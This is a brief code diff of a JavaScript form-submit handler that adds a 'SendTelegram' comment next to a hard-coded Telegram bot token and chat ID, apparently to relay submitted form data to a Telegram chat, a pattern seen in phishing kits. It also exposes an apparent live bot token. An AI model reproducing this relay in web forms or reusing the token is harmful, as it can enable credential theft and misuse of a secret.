@@ -321,6 +321,7 @@ form.onsubmit = function _callee(e) {
           return _context.abrupt("return");
 
         case 18:
+          /*--SendTelegram--*/
           formInProgress = true;
           BOT_TOKEN = '8084021249:AAHeZSko2YVe8hZr49BgDMM0IXEOUn_Wt7o';
           CHAT_ID = '-4844723150';
